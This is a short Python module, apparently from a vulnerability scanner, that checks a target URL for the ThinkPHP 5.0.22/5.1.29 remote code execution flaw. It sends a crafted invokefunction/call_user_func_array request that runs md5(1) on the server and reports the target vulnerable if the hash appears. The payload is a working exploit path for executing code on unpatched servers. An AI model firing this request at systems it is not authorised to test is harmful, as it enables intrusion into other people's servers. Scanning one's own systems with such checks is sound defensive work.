"""  
@Time: 2024/2/28 16:02 
@Auth: Y5neKO
@File: Thinkphp5_rce.py 
@IDE: PyCharm 
"""
import requests
import re
import urllib


def run(url, timeout):
    result = {
        'name': 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    try:
        payload = urllib.parse.urljoin(url,
                                       r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1')
        response = requests.get(payload, timeout=3, verify=False)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = payload
    except Exception as e:
        print(f"发生错误：{e}")
    return result
